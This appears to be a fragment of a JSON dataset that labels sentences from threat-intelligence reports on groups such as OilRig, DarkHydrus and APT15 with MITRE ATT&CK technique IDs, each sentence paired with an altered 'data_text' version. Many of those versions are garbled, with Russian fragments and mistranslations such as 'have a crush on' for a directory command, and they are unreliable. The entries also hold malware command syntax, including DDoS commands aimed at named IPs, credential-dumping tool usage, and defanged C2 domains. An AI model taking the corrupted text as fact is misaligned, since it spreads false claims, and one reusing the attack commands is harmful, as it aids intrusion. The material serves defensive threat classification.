    "Our observation of related actions here:    u ps start password stealing (Windows)   Ps_mps/ps_hwi start start password stealing (Linux, MIPS,  ARM)   uper_mps/uper_hwi start rewrite hook module with a new version and launch it (Linux, MIPS, ARM)   Nm_mps/nm_hwi start  –ban -middle Scan ports and retrieve banners on the router subnet  (Linux, MIPS,  ARM)   U fsget * 7 *.docx, *.pdf, *.doc * search for docs with the given filetypes (Windows)   S sinfo retrieve information on installed programs and launch commands: systeminfo, tasklist, ipconfig, netstat, route print, tracert www.google.com (Windows)   weap_mps/weap_hwi host188.128.123.52 port[25,26,110,465,995]  typetcpconnect DDoS on 188.128.123.52 (Linux, MIPS,  ARM)   weap_mps/weap_hwi  typesynflood port80 cnt100000 spdmedium host212.175.109.10 DDoS on 212.175.109.10 (Linux, MIPS,  ARM)    The issued commands for the Linux plugins suggest the attackers controlled infected MIPS/ARM devices. We want to pay special attention to the DDoS commands meant for these routers": [],
    "The information contained in this data dump include:  Stolen credentials Potential systems to login to using stolen credentials Deployed webshell URLs Backdoor tools Command and control server component of backdoor tools Scripts to perform DNS hijacking Documents identifying specific individual operators Screenshots of OilRig operational systems  The Leak In mid-March 2019, an unknown entity appeared on several hacking forums and Twitter with the user handle @Mr_L4nnist3r claiming they had access to data dumps involving internal tools and data used by the OilRig group": [
        {
            "tec_id": "T1003",
            "en_text": "The information contained in this data dump include:  Stolen credentials Potential systems to login to using stolen credentials Deployed webshell URLs Backdoor tools Command and control server component of backdoor tools Scripts to perform DNS hijacking Documents identifying specific individual operators Screenshots of OilRig operational systems  The Leak In mid-March 2019, an unknown entity appeared on several hacking forums and Twitter with the user handle @Mr_L4nnist3r claiming they had access to data dumps involving internal tools and data used by the OilRig group",
            "data_text": "The information contained in this, there data, includes Kidnappers ' victims of account information outlines the system for the use of stolen accounts data designed Web page URLs Backdoor Tools Command and Control server component Backdoor tools Scripts for the implementation of the DNS-хид-документов, identifying individual operators The operating systems OilRigd on several hacker.In addition, several forums and Twitter with the user handle @Mr_L4nnnist3r claimed that they had access to data dumps involving internal tools and data used by the OilRig group."
        }
    ],
    "The datasets included:  Stolen credentials Potential systems to login to using stolen credentials Deployed webshell URLs Backdoor tools Command and control server component of backdoor tools Script to perform DNS hijacking Documents identifying specific individual operators Screenshots of OilRig operational systems  We analyzed each type of dataset other than the documents containing detailed information on alleged OilRig operators and they remain consistent with previously observed OilRig tactics, techniques, and procedures (TTPs)": [
        {
            "tec_id": "T1003",
            "en_text": "The datasets included:  Stolen credentials Potential systems to login to using stolen credentials Deployed webshell URLs Backdoor tools Command and control server component of backdoor tools Script to perform DNS hijacking Documents identifying specific individual operators Screenshots of OilRig operational systems  We analyzed each type of dataset other than the documents containing detailed information on alleged OilRig operators and they remain consistent with previously observed OilRig tactics, techniques, and procedures (TTPs)",
            "data_text": "A data on the following : The stolen account information outlines the system for the use of stolen accounts data designed Web page URLs Backdoor Tools Command and control server component backdoor tools site for the implementation of the DNS-хид-документовNTS contain detailed information on alleged statements OilRig and they are agreed with the access of all that.OilRig (TTP) technology, techniques and procedures."
        }
    ],
    "In total, nearly 13,000 sets of credentials are included in the data dump": [
        {
            "tec_id": "T1003",
            "en_text": "In total, nearly 13,000 sets of credentials are included in the data dump",
            "data_text": "A total of nearly 13,000 credential sets are included in the data dump"
        }
    ],
    "The credentials appear to have been stolen via multiple techniques, including using post-exploition password recovery tools such as MimiKatz or its variant ZhuMimiKatz": [
        {
            "tec_id": "T1003",
            "en_text": "The credentials appear to have been stolen via multiple techniques, including using post-exploition password recovery tools such as MimiKatz or its variant ZhuMimiKatz",
            "data_text": "Credentials appear to have been stolen using several methods, including using password recovery tools after the explosion, such as MimiKatz or its ZhuMimiKatz variant."
        }
    ],
    "In addition to these tools, we believe OilRig attackers obtained credentials through, bruteforcing, SQL injections, and using traditional credential harvesting toolkits as we discussed in the Striking Oil blog published in September 2017": [
        {
            "tec_id": "T1003",
            "en_text": "In addition to these tools, we believe OilRig attackers obtained credentials through, bruteforcing, SQL injections, and using traditional credential harvesting toolkits as we discussed in the Striking Oil blog published in September 2017",
            "data_text": "In addition to these tools, we believe that OilRig attackers have obtained credentials through, graphening, SQL injection, and using traditional tooling buildups as we discussed in the blog Striking Oil published in September 2017."
        }
    ],
    "It appears to us that one organization had its entire Active Directory dumped out, making up most of the credentials we found in the data dump": [
        {
            "tec_id": "T1003",
            "en_text": "It appears to us that one organization had its entire Active Directory dumped out, making up most of the credentials we found in the data dump",
            "data_text": "We feel that one organization has completely abandoned Active Directory, making up most of the credentials we found in the data dump."
        }
    ],
    "We are unable to confirm if all of these stolen credentials are indeed valid sets of credentials, but based upon previously observed activity, timestamping, and known behaviors, it is highly probable that these credentials were or may still be valid": [
        {
            "tec_id": "T1003",
            "en_text": "We are unable to confirm if all of these stolen credentials are indeed valid sets of credentials, but based upon previously observed activity, timestamping, and known behaviors, it is highly probable that these credentials were or may still be valid",
            "data_text": "We cannot confirm whether all of these stolen credentials are valid sets of credentials, but based on previously observed activity, time, and known behavior, it is highly likely that these credentials were or may still be valid."
        }
    ],
    "Assuming the lists of credentials are valid, the mass collection confirms our hypothesis that the OilRig group maintains a heavy emphasis on credential based attacks along with the other types of attacks they deploy": [
        {
            "tec_id": "T1003",
            "en_text": "Assuming the lists of credentials are valid, the mass collection confirms our hypothesis that the OilRig group maintains a heavy emphasis on credential based attacks along with the other types of attacks they deploy",
            "data_text": "Assuming the credential lists are valid, mass build confirms our hypothesis that the OilRig group continues to pay close attention to credential-based attacks, along with the other types of attacks they deploy."
        }
    ],
    "When entered, these credentials are then sent to the C2 server, which allows DarkHydrus to collect the user account credentials": [
        {
            "tec_id": "T1003",
            "en_text": "When entered, these credentials are then sent to the C2 server, which allows DarkHydrus to collect the user account credentials",
            "data_text": "When entered, these credentials are sent to the C2 server, which allows DarkHydrus to collect user credentials."
        }
    ],
    "Credential Harvesting Attack On June 24, 2018, Unit 42 observed DarkHydrus carrying out a credential harvesting attack on an educational institution in the Middle East": [
        {
            "tec_id": "T1003",
            "en_text": "Credential Harvesting Attack On June 24, 2018, Unit 42 observed DarkHydrus carrying out a credential harvesting attack on an educational institution in the Middle East",
            "data_text": "On 24 June 2018, Unit 42 observed a dark hydrometer collecting credentials for an educational institution in the Middle East."
        }
    ],
    "Figure 2 Employee survey displayed after credential theft The November 2017 document displays a password handover document after credential theft occurs, as seen in Figure 3": [
        {
            "tec_id": "T1003",
            "en_text": "Figure 2 Employee survey displayed after credential theft The November 2017 document displays a password handover document after credential theft occurs, as seen in Figure 3",
            "data_text": "Figure 2 Employee survey shown after stealing credentials The November 2017 document shows the password transfer document after stealing credentials as shown in Figure 3"
        }
    ],
    "Figure 3 Password handover form displayed after credential theft The infrastructure used in these credential harvesting attacks used the domain 0utl00k[.]net, which at the time of the attacks resolved to 107.175.150[.]113 and 195.154.41[.]150": [
        {
            "tec_id": "T1003",
            "en_text": "Figure 3 Password handover form displayed after credential theft The infrastructure used in these credential harvesting attacks used the domain 0utl00k[.]net, which at the time of the attacks resolved to 107.175.150[.]113 and 195.154.41[.]150",
            "data_text": "Figure 3 The form of password transfer displayed after the theft of credentials Infrastructure used in these data collection attacks used domain 0utl00k[.]net, which at the time of the attacks allowed up to 107,175,150[.]113 and 195.154.41[.]150"
        }
    ],
    "Figure 6 Authentication dialog box with fake credentials entered On the C2 server, we observed Phishery receiving the inbound request and capturing the credentials, as seen in Figure 7": [
        {
            "tec_id": "T1003",
            "en_text": "Figure 6 Authentication dialog box with fake credentials entered On the C2 server, we observed Phishery receiving the inbound request and capturing the credentials, as seen in Figure 7",
            "data_text": "The Authentication dialog box with false credentials entered on the C2 server, we observed Fisher receiving an incoming request and capturing the credentials as shown in Figure 7."
        }
    ],
    "Vault was implemented in Windows 7, it contains any sensitive data (like the credentials) of Internet Explorer": [
        {
            "tec_id": "T1003",
            "en_text": "Vault was implemented in Windows 7, it contains any sensitive data (like the credentials) of Internet Explorer",
            "data_text": "Windows 7 implements a waltz that contains any sensitive data (such as credentials) of Internet Explorer"
        }
    ],
    "The malware accepts up to two arguments at the command line: one to display cleartext credentials for each login session, and a second to display cleartext credentials, NTLM hashes, and malware version for each login session": [
        {
            "tec_id": "T1003",
            "en_text": "The malware accepts up to two arguments at the command line: one to display cleartext credentials for each login session, and a second to display cleartext credentials, NTLM hashes, and malware version for each login session",
            "data_text": "Malware accepts up to two arguments on the command line: one to display credentials for each login session, and the other to display Cleartext credentials, NTLM hashes, and malware versions for each login session."
        }
    ],
    "This private data includes stored passwords, login credential information from Web browsers, and a variety of cryptocurrency wallets": [
        {
            "tec_id": "T1003",
            "en_text": "This private data includes stored passwords, login credential information from Web browsers, and a variety of cryptocurrency wallets",
            "data_text": "This private data includes stored passwords, credentials from web browsers, and various cryptocurrency wallets."
        }
    ],
    "Alerts for credential theft tools and privileged account lockouts should be investigated": [
        {
            "tec_id": "T1003",
            "en_text": "Alerts for credential theft tools and privileged account lockouts should be investigated",
            "data_text": "Alerts about theft of credentials and privileged account locks should be investigated"
        }
    ],
    "(Source: Dell SecureWorks)   TG-3390 actors have also used the following publicly available tools:  Windows Credential Editor (WCE) — obtains passwords from memory gsecdump — obtains passwords from memory winrar — compresses data for exfiltration nbtscan — scans NetBIOS name servers  Tactics, techniques, and procedures Incident response engagements have given CTU researchers insight into the tactics TG-3390 employs during intrusions": [
        {
            "tec_id": "T1003",
            "en_text": "(Source: Dell SecureWorks)   TG-3390 actors have also used the following publicly available tools:  Windows Credential Editor (WCE) — obtains passwords from memory gsecdump — obtains passwords from memory winrar — compresses data for exfiltration nbtscan — scans NetBIOS name servers  Tactics, techniques, and procedures Incident response engagements have given CTU researchers insight into the tactics TG-3390 employs during intrusions",
            "data_text": "(Сource, Dell SecureWorks) Актёры TG-3390 also used the publicly available tools : Editor other accounts data with (WCE) — gets passwords from memory gsecdump — gets passwords from winrar of — data for exfiltration nbtscan — scans NetBИмя of the IOS Tactics, methods and procedures Заключения in response to incidents gave researchers CTU of tactics.used by the TG-3390 during invasions"
        }
    ],
    "15 Database dump Decoded, it reveals a detailed log of each affected machine": [
        {
            "tec_id": "T1003",
            "en_text": "15 Database dump Decoded, it reveals a detailed log of each affected machine",
            "data_text": "15 Database Dump Decoded, it shows detailed log of each affected machine"
        }
    ],
    "Mimikatz to obtain credentials.": [
        {
            "tec_id": "T1003",
            "en_text": "Mimikatz to obtain credentials.",
            "data_text": "Mimicatts for obtaining credentials."
        }
    ],
    "Also, the use of the  mimikatz and pwdump tools suggests the adversary attempts to dump credentials on compromised systems": [
        {
            "tec_id": "T1003",
            "en_text": "Also, the use of the  mimikatz and pwdump tools suggests the adversary attempts to dump credentials on compromised systems",
            "data_text": "Also using mimikatz and pwdump tools involves attempts by the opponent to reset credentials to compromised systems."
        }
    ],
    "It was heavily modified, with almost all original code stripped out aside from its sekurlsa::logonpasswords credential stealing feature": [
        {
            "tec_id": "T1003",
            "en_text": "It was heavily modified, with almost all original code stripped out aside from its sekurlsa::logonpasswords credential stealing feature",
            "data_text": "It is heavily modified, almost all source code has been removed aside from its securlsa::logonpasswords credential theft function"
        }
    ],
    "Domains The RoyalCli backdoor was attempting to communicate to the following domains:  News.memozilla[.]org video.memozilla[.]org  The BS2005 backdoor utilised the following domains for C2:  Run.linodepower[.]com Singa.linodepower[.]com log.autocount[.]org  RoyalDNS backdoor was seen communicating to the domain:  andspurs[.]com  Possible linked APT15 domains include:  Micakiz.wikaba[.]org cavanic9[.]net ridingduck[.]com zipcodeterm[.]com dnsapp[.]info   Published date:  10 March 2018   Written by:  Rob Smallridge": [],
    "In order to extend the lifespan of the domains in case one or more are blacklisted, there are twelve different C2 domains that xparis() can be set to": [
        {
            "tec_id": "T1008",
            "en_text": "In order to extend the lifespan of the domains in case one or more are blacklisted, there are twelve different C2 domains that xparis() can be set to",
            "data_text": "To extend the service life of domains, in case one or more domains are cross-checked, there are twelve different C2 domains, which xparis() can be configured to use."
        }
    ],
    "Indicators of Compromise (IoCs)    C&C servers    Ssl[.]arkouthrie[.]com   s3[.]hiahornber[.]com   widget[.]shoreoa[.]com       SHA256   Delivery document (W2KM_OCEANLOTUS.A): 2bb855dc5d845eb5f2466d7186f150c172da737bfd9c7f6bc1804e0b8d20f22a   Dropper (OSX_OCEANLOTUS.D): 4da8365241c6b028a13b82d852c4f0155eb3d902782c6a538ac007a44a7d61b4   Backdoor (OSX_OCEANLOTUS.D): 673ee7a57ba3c5a2384aeb17a66058e59f0a4d0cddc4f01fe32f369f6a845c8f   The post New MacOS Backdoor Linked to OceanLotus Found appeared first on": [],
    "Additionally malware reports itself to its hardcoded command and control servers and established a backdoor connection, so the attacker may have a permanent remote connection": [
        {
            "tec_id": "T1008",
            "en_text": "Additionally malware reports itself to its hardcoded command and control servers and established a backdoor connection, so the attacker may have a permanent remote connection",
            "data_text": "In addition, malicious software reports itself to hard-coded command and control servers and establishes a connection to the back door so that an attacker can have a permanent remote connection."
        }
    ],
    "Business and government personnel who are traveling, especially in a foreign country, often rely on systems to conduct business other than those at their home office, and may be unfamiliar with threats posed while abroad": [
        {
            "tec_id": "T1083",
            "en_text": "Business and government personnel who are traveling, especially in a foreign country, often rely on systems to conduct business other than those at their home office, and may be unfamiliar with threats posed while abroad",
            "data_text": "Business and government employees who travel, especially in a foreign country, often rely on business systems other than those in their home office, and may not be familiar with threats that arise overseas."
        }
    ],
    "These files are downloaded to a directory (C:\\Users\\Public\\Libraries\\tempsys) on the infected machine by Bxaki() and xparis()": [
        {
            "tec_id": "T1083",
            "en_text": "These files are downloaded to a directory (C:\\Users\\Public\\Libraries\\tempsys) on the infected machine by Bxaki() and xparis()",
            "data_text": "These files are uploaded to the directory (C:\\User\\Public\\Libraries\\timesys) on the infected machine using Bxaki() and xparis()."
        }
    ],
    "In this particular case in 2013, the config file included an unknown plugin set, aside from the usual ‘ddos’ plugin listing": [
        {
            "tec_id": "T1083",
            "en_text": "In this particular case in 2013, the config file included an unknown plugin set, aside from the usual ‘ddos’ plugin listing",
            "data_text": "In this particular case, in 2013, the configuration file included an unknown set of plugins, in addition to the usual list of 'ddos' plugins."
        }
    ],
    "The malware then appends a script extension (php, bml, or cgi) with a random number of random parameters or a file extension from the following list with no parameters: gif, jpg, png, htm, html, php": [
        {
            "tec_id": "T1083",
            "en_text": "The malware then appends a script extension (php, bml, or cgi) with a random number of random parameters or a file extension from the following list with no parameters: gif, jpg, png, htm, html, php",
            "data_text": "The malware then adds a script extension (php, bml, or cgi) with random number of parameters or a file extension from a list that does not contain parameters: gif, jpg, png, htm, html, php"
        }
    ],
    "The body of the POST request may contain files contained in the cabinet format": [
        {
            "tec_id": "T1083",
            "en_text": "The body of the POST request may contain files contained in the cabinet format",
            "data_text": "The POST request body may contain files contained in the cabinet format"
        }
    ],
    "It should be noted that the Win32/KillDisk.NBB variant used against media companies is more focused on destroying various types of files and documents": [
        {
            "tec_id": "T1083",
            "en_text": "It should be noted that the Win32/KillDisk.NBB variant used against media companies is more focused on destroying various types of files and documents",
            "data_text": "It should be noted that Win32/KillDisk.The NBB option used against media companies is more focused on destroying different types of files and documents"
        }
    ],
    "Figure 3 – A list of file extensions targeted for destruction by new variant of KillDisk component As well as being able to delete system files to make the system unbootable – functionality typical for such destructive trojans – the KillDisk variant detected in the electricity distribution companies also appears to contain some additional functionality specifically intended to sabotage industrial systems": [
        {
            "tec_id": "T1083",
            "en_text": "Figure 3 – A list of file extensions targeted for destruction by new variant of KillDisk component As well as being able to delete system files to make the system unbootable – functionality typical for such destructive trojans – the KillDisk variant detected in the electricity distribution companies also appears to contain some additional functionality specifically intended to sabotage industrial systems",
            "data_text": "Figure 3 – List of file extensions designed to destroy with the new KillDisk component option. In addition, the ability to remove system files to make the system unloadable – a feature characteristic of such destructive Trojans – the KillDisk variant found in power distribution companies also contains some additional features.in particular for sabotage of industrial systems."
        }
    ],
    "This is the only instance we observed where a hardcoded Google Drive URL was included in RogueRobin, which may suggest that the author may have overlooked this during testing": [
        {
            "tec_id": "T1083",
            "en_text": "This is the only instance we observed where a hardcoded Google Drive URL was included in RogueRobin, which may suggest that the author may have overlooked this during testing",
            "data_text": "This is the only case we've observed when a hard-coded Google Drive URL has been included in RogueRobin, which may suggest that the author may have missed this during testing."
        }
    ],
    "HD Creates a file in the Temp path and names it “hd” + PCID then invokes another program module named hd.test1 to identify logical drives": [
        {
            "tec_id": "T1083",
            "en_text": "HD Creates a file in the Temp path and names it “hd” + PCID then invokes another program module named hd.test1 to identify logical drives",
            "data_text": "HD Creates a file in the Temp path and calls it \"hd\" + PCID, and then invokes another program module hd.test1 to identify logical disks"
        }
    ],
    "Implant directory contained in the malicious Flash file": [
        {
            "tec_id": "T1083",
            "en_text": "Implant directory contained in the malicious Flash file",
            "data_text": "The implant catalog contained in the malicious Flash file"
        }
    ],
    "Otherwise, it runs a search for the “/bin/rsyncd” string within the files found in the /etc/ folder": [
        {
            "tec_id": "T1083",
            "en_text": "Otherwise, it runs a search for the “/bin/rsyncd” string within the files found in the /etc/ folder",
            "data_text": "Otherwise, it starts searching for the string \"/bin/rsyncd\" in the files found in the /etc/ folder."
        }
    ],
    "watch/?   search/?  find/?    results/? open/?    search/?  close/?   The “ai” value stands for the payload title": [
        {
            "tec_id": "T1083",
            "en_text": "watch/?   search/?  find/?    results/? open/?    search/?  close/?   The “ai” value stands for the payload title",
            "data_text": "look/?look/?find/? results/? open/? search/? close/? value \"ai\" means download name"
        }
    ],
    "DRIVE Lists the logical drives and the type, as well the total/free space of the fixed devices": [
        {
            "tec_id": "T1083",
            "en_text": "DRIVE Lists the logical drives and the type, as well the total/free space of the fixed devices",
            "data_text": "DRIVE List of logical drives and types, as well as common/free fixed device space"
        }
    ],
    "Command Description   !Dir Lists the contents of a specified directory   !Drives Enumerates the storage drives attached to the system and their respective type": [
        {
            "tec_id": "T1083",
            "en_text": "Command Description   !Dir Lists the contents of a specified directory   !Drives Enumerates the storage drives attached to the system and their respective type",
            "data_text": "Description of the team description !Dir. List of contents of the specified directory !Drives list the drives attached to the system and their type"
        }
    ],
    "The dropped files are either in the root of the “ProgramData” folder or in a subdirectory": [
        {
            "tec_id": "T1083",
            "en_text": "The dropped files are either in the root of the “ProgramData” folder or in a subdirectory",
            "data_text": "The dropped files are either at the root of the ProgramDate folder or in the subdirectory"
        }
    ],
    "The file names may vary from one version of the malware to another": [
        {
            "tec_id": "T1083",
            "en_text": "The file names may vary from one version of the malware to another",
            "data_text": "Filenames can vary from one version of malware to another."
        }
    ],
    "In one version of the malware, the code checks if the “ProgramData” folder has folders or files with the keywords “Kasper“, “Panda“, or “ESET“": [
        {
            "tec_id": "T1083",
            "en_text": "In one version of the malware, the code checks if the “ProgramData” folder has folders or files with the keywords “Kasper“, “Panda“, or “ESET“",
            "data_text": "In one version of malware, the code checks whether the \"ProgramDate\" folder has folders or files with the keywords \"Kasper\", \"Panda\", or \"ESET\""
        }
    ],
    "It mimics the icon Finder usually applies to JPEG or text files to increase the likelihood the recipient will double-click the file": [
        {
            "tec_id": "T1083",
            "en_text": "It mimics the icon Finder usually applies to JPEG or text files to increase the likelihood the recipient will double-click the file",
            "data_text": "This mimics the Finder icon, usually applied to JPEG or text files to increase the likelihood that the recipient will double-click on the file"
        }
    ],
    "Figure 7: Property list file in LaunchAgents directory To camouflage the location of the malicious file, Keydnap replaces argv[0] with /usr/libexec/icloudsyncd –launchd netlogon.bundle": [
        {
            "tec_id": "T1083",
            "en_text": "Figure 7: Property list file in LaunchAgents directory To camouflage the location of the malicious file, Keydnap replaces argv[0] with /usr/libexec/icloudsyncd –launchd netlogon.bundle",
            "data_text": "Figure 7: The property list file in the LaunchAgents directory To hide the location of the malicious file, Keydnap replaces argv[0] with /usr/libexec/icloudsyncd –launchd netlogon.in a set"
        }
    ],
    ".iqy files are simple text files containing a URL which are opened by default by Excel": [
        {
            "tec_id": "T1083",
            "en_text": ".iqy files are simple text files containing a URL which are opened by default by Excel",
            "data_text": ".iqy files are plain text files that contain URLs that are opened by Excel by default"
        }
    ],
    "The file appears to have been compiled using a bat2exe tool, which will take batch files (.bat) and convert them to PE (.exe) files": [
        {
            "tec_id": "T1083",
            "en_text": "The file appears to have been compiled using a bat2exe tool, which will take batch files (.bat) and convert them to PE (.exe) files",
            "data_text": "The file appears to have been compiled using the bat2exe tool, which will accept batch files (.bat) and convert them to PE (.exe) files."
        }
    ],
    "Unlike a previously reported variant, this version of BADNEWS no longer looks at USB drives for interesting files": [
        {
            "tec_id": "T1083",
            "en_text": "Unlike a previously reported variant, this version of BADNEWS no longer looks at USB drives for interesting files",
            "data_text": "Unlike the previously reported version, this version of BADNEWS no longer looks at USB drives for interesting files"
        }
    ],
    "4 Upload edg499.dat, which includes the list of interesting files": [
        {
            "tec_id": "T1083",
            "en_text": "4 Upload edg499.dat, which includes the list of interesting files",
            "data_text": "4 Download edg499.dat, which includes a list of interesting files"
        }
    ],
    "Since it is a very long term group, some victims may be impossible to identify now": [
        {
            "tec_id": "T1083",
            "en_text": "Since it is a very long term group, some victims may be impossible to identify now",
            "data_text": "Because it's a very long group, some victims may be low to determine now"
        }
    ],
    "These platforms may not be well maintained and may break intermittently": [
        {
            "tec_id": "T1083",
            "en_text": "These platforms may not be well maintained and may break intermittently",
            "data_text": "These platforms may not be supported and may be interrupted from time to time"
        }
    ],
    "PHOTO: a DLL backdoor also reported publicly as “Derusbi”, capable of obtaining directory, file, and drive listing; creating a reverse shell; performing screen captures; recording video and audio; listing, terminating, and creating processes; enumerating, starting, and deleting registry keys and values; logging keystrokes, returning usernames and passwords from protected storage; and renaming, deleting, copying, moving, reading, and writing to files": [
        {
            "tec_id": "T1083",
            "en_text": "PHOTO: a DLL backdoor also reported publicly as “Derusbi”, capable of obtaining directory, file, and drive listing; creating a reverse shell; performing screen captures; recording video and audio; listing, terminating, and creating processes; enumerating, starting, and deleting registry keys and values; logging keystrokes, returning usernames and passwords from protected storage; and renaming, deleting, copying, moving, reading, and writing to files",
            "data_text": "PHOTO, backdoor is particularly important also publicly reported as \"Derusbi\", able to obtain a list of directories, files and disks ; a back shell, to implement holds the screen, to record videos and audio ; transfer to and create processes ; the state, start, and delete the registry and values ; to write keys, the user names and pас-слова of secure storage ; and переименов.file sharing, deletion, copying, moving, reading, and writing"
        }
    ],
    "This allows the shell to upload and download files, execute applications with web server account permissions, list directory contents, access Active Directory, access databases, and any other action allowed by the .NET runtime": [
        {
            "tec_id": "T1083",
            "en_text": "This allows the shell to upload and download files, execute applications with web server account permissions, list directory contents, access Active Directory, access databases, and any other action allowed by the .NET runtime",
            "data_text": "This allows the shell to upload and upload files, run applications with Web server account permissions, list directory contents, access Active Directory, access databases, and any other action allowed by .NET implementation"
        }
    ],
    "Included in the directories were a combination of files leveraged in targeted attacks mentioned above against nation states": [
        {
            "tec_id": "T1083",
            "en_text": "Included in the directories were a combination of files leveraged in targeted attacks mentioned above against nation states",
            "data_text": "The directories include files used in the target attacks mentioned above against member states."
        }
    ],
    "Open directory listing of hxxp://stevemike-fireforce[.]info/ Based on the contents and structure of the initial identified open directories, it was possible to find several infrastructure patterns in use": [
        {
            "tec_id": "T1083",
            "en_text": "Open directory listing of hxxp://stevemike-fireforce[.]info/ Based on the contents and structure of the initial identified open directories, it was possible to find several infrastructure patterns in use",
            "data_text": "Open Directory List hxxp://stevemike-fireforce[.]info/ Based on the contents and structure of the initially identified open directories, several infrastructure templates used could be found"
        }
    ],
    "High Commissioner of Bangladesh Pakistan eying Sukhoi-35 fighter planes as part of defense deal from Russia 2018.143 PG COURSE IN 2018-2021 BATCH India Bangladesh and Pakistan Press Release on Observance of Historic Mujibnogor Dibosh by Pakistan Mission on 17 April 2018 Afghan Bomb Blast report by ISI USAJOBS Daily Saved Search Results for New GS15 for 3/30/2018 How Rigging take place in Senate Elections in Pakistan Afghan Terrorist group details ISI Restricted113 1971 Liberation War Freedom Fighters in Pakistan Army Custody Database  Additionally, the following filenames were witnessed in these attacks (spelling and grammar mistakes included):  Liberation Freedom Fighter.xlam NSC details of participants.xlam Raw Sect Vikram report on Pak Army Confidential.doc USA Immagration Policy for Families.ppam doc CV FM.doc doc Sukhoi35 deal report.doc Nominal Roll.doc Press Release 17 April.doc Afghan Blast report by ISI.doc Rigging in Pakistan Senate.doc Afghan Terrorist group report.doc    The payloads for these attacks varied in malware family": [
        {
            "tec_id": "T1083",
            "en_text": "High Commissioner of Bangladesh Pakistan eying Sukhoi-35 fighter planes as part of defense deal from Russia 2018.143 PG COURSE IN 2018-2021 BATCH India Bangladesh and Pakistan Press Release on Observance of Historic Mujibnogor Dibosh by Pakistan Mission on 17 April 2018 Afghan Bomb Blast report by ISI USAJOBS Daily Saved Search Results for New GS15 for 3/30/2018 How Rigging take place in Senate Elections in Pakistan Afghan Terrorist group details ISI Restricted113 1971 Liberation War Freedom Fighters in Pakistan Army Custody Database  Additionally, the following filenames were witnessed in these attacks (spelling and grammar mistakes included):  Liberation Freedom Fighter.xlam NSC details of participants.xlam Raw Sect Vikram report on Pak Army Confidential.doc USA Immagration Policy for Families.ppam doc CV FM.doc doc Sukhoi35 deal report.doc Nominal Roll.doc Press Release 17 April.doc Afghan Blast report by ISI.doc Rigging in Pakistan Senate.doc Afghan Terrorist group report.doc    The payloads for these attacks varied in malware family",
            "data_text": "On April 17, 2018, under a defense contract with Russia for Sukhoi-35 aircraft under the UNDP 2018 program.143 The ЛТИ in 2018-2021 the ЛТИ India, Bangladesh and Pakistan Пресс-релиз of the Mission of Pakistan for historical Муджибногом Дибош 3/30/2018 As in the elections in the Senate of Pakistan were tightening the various terrorist groups of Afghanistan, the ISI Restricted113 of Liberation War Freedom Fighters in Pakistan of Custody Database In addition, in all these attacks were scientific evidence the following. filenames (including errors in words and grammar): Liberation fighter.xlam NSC details of participants.Doc Doc CV FM.doc Doc Sukhoi35 deal.doc Nominal Roll.doc Press release April 17.doc Afghan Explosive Report from the Senate of Pakistan.doc Afghan terrorist group.doc"
        }
    ],
    "With the exception of the ‘Speed’ method previously mentioned, the names of the methods called in this chain appear to be fairly random, as seen in the following list:    ETransaksi.Speed ETransaksi.diomadnfagaghagh ETransaksi.fjcsERIfjfiojsGHIsdifjksi ETransaksi.gsgjIDJIGJIGJIGJIFDOSpl ETransaksi.FJaioefgkaoeK    The last two methods in the chain carry out a majority of the first payload’s functionality": [
        {
            "tec_id": "T1083",
            "en_text": "With the exception of the ‘Speed’ method previously mentioned, the names of the methods called in this chain appear to be fairly random, as seen in the following list:    ETransaksi.Speed ETransaksi.diomadnfagaghagh ETransaksi.fjcsERIfjfiojsGHIsdifjksi ETransaksi.gsgjIDJIGJIGJIGJIFDOSpl ETransaksi.FJaioefgkaoeK    The last two methods in the chain carry out a majority of the first payload’s functionality",
            "data_text": "With the exception of the above-mentioned 'Speed' method, the names of the methods called in this chain seem quite random, as seen in the following list: ETransaction.ETRASAXI speed.DIAMADNPHAGES OF ETRASACSI.PHYSICAL TRANSACTIONS.GGGGGJIGJIGJIFDOSpl ETransaction.JIGJIGJIFDOSpl ETransaction.The last two methods in the chain perform most of the functionality of the first payload"
        }
    ],
    "Hashes For a list of all hashes of malware encountered during this campaign, please refer to the following file": [
        {
            "tec_id": "T1083",
            "en_text": "Hashes For a list of all hashes of malware encountered during this campaign, please refer to the following file",
            "data_text": "Hash For a list of all malware hashes detected during the campaign, please refer to the following file"
        }
    ],
    "17 Complete List of Malware Files  Fig": [
        {
            "tec_id": "T1083",
            "en_text": "17 Complete List of Malware Files  Fig",
            "data_text": "17 Full list of malicious files Fig."
        }
    ],
    "17-3 Function names To target specific victims, Astaroth is locale aware; any attempts to run the malware without locale spoofing will result in failed downloads and the inability to run the .dll files": [
        {
            "tec_id": "T1083",
            "en_text": "17-3 Function names To target specific victims, Astaroth is locale aware; any attempts to run the malware without locale spoofing will result in failed downloads and the inability to run the .dll files",
            "data_text": "17-3 Functional names For the purposes of specific victims, Astaroth knows the local; any attempts to run malware without local tampering will result in failed downloads and inability to run .dll files."
        }
    ],
    "119 readFiles Obtains file information on a file or a folder, and supports a “*” wildcard and recursive file list": [
        {
            "tec_id": "T1083",
            "en_text": "119 readFiles Obtains file information on a file or a folder, and supports a “*” wildcard and recursive file list",
            "data_text": "119 readFiles Retrieves information about a file or folder, maintains a \"*\" disk list and recursive list of files"
        }
    ],
    "Get Directory Information The malware gets information for the provided directory address using the following WINAPI calls:": [
        {
            "tec_id": "T1083",
            "en_text": "Get Directory Information The malware gets information for the provided directory address using the following WINAPI calls:",
            "data_text": "Obtain Directory Information Malware obtains directory information provided using the following WINAPI calls:"
        }
    ],
    "searches for files": [
        {
            "tec_id": "T1083",
            "en_text": "searches for files",
            "data_text": "file search"
        }
    ],
    "dir c:\\": [
        {
            "tec_id": "T1083",
            "en_text": "dir c:\\",
            "data_text": "have a crush on"
        }
    ],
    "2, 2018, we published a blog detailing the use of an Adobe Flash zero-day vulnerability (CVE-2018-4878) by a suspected North Korean cyber espionage group that we now track as APT37 (Reaper)": [
        {
            "tec_id": "T1203",
            "en_text": "2, 2018, we published a blog detailing the use of an Adobe Flash zero-day vulnerability (CVE-2018-4878) by a suspected North Korean cyber espionage group that we now track as APT37 (Reaper)",
            "data_text": "2, 2018, we published a blog detailing the zero-day use of Adobe Flash vulnerability (CVE-2018-4878), which is suspected by the North Korean cyber espionage group, which we are currently tracking as APT37 (Reaper)"
        }
    ],
    "Observed vulnerabilities include:  CVE-2012-0158  CVE-2017-0199  CVE-2017-8759  CVE-2017-11882       Figure 2: APT40 attack lifecycle  Establish Foothold APT40 uses a variety of malware and tools to establish a foothold, many of which are either publicly available or used by other threat groups": [
        {
            "tec_id": "T1203",
